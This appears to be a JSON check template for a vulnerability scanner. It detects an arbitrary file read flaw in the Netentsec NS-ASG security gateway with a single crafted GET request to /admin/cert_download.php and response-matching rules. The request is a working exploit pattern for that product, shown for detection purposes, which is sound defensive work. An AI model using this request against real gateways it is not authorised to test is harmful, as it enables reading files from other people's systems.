{
    "Name": "netentsec-asg-file-read",
    "Description": "网康 NS-ASG安全网关 任意文件读取漏洞",
    "Product": "网康",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "$certfile"
                },
                {
                 "Operation": "contains", 
                 "Key":"",
                 "Value": "application/pdf"
                 },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
            ]}